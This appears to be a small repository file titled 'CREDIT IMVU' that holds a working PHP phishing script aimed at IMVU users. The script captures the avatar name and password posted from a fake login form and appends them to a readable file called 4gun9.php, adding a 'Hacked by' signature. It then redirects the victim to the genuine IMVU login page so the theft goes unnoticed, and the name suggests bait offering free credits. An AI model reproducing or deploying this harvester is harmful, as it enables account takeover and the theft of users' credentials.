# CREDIT-IMVU
CREDIT IMVU
<?php
header("Location: https://id.secure.imvu.com/login/login/");
$ADEx = "4gun9.php";
$ADEy = $_POST['avatarname'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "");
fwrite($handle, "\n");
fwrite($handle, "<br>Email  :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "<br>Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "<br> <a href='http://mobindo.org'>Hacked by ./Mr.KusanagiV.For</a>");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
